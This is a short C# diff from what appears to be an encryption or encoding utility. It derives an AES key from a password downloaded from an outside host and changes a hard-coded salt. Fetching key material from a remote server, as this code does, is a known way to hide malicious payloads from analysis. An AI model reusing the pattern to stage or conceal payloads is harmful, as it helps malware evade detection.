@@ -52,7 +52,7 @@ namespace Encode
         {
             PasswordDeriveBytes pdb =
           new PasswordDeriveBytes(new WebClient().DownloadString("http://zurrapa.host/bm9LYXBwYQ"), // Change this
-          new byte[] { 0x43, 0x87, 0x23, 0x72 }); // Change this
+          new byte[] { 0x13, 0x37, 0x42, 0x0 }); // Change this
             MemoryStream ms = new MemoryStream();
             Aes aes = new AesManaged();
             aes.Key = pdb.GetBytes(aes.KeySize / 8);
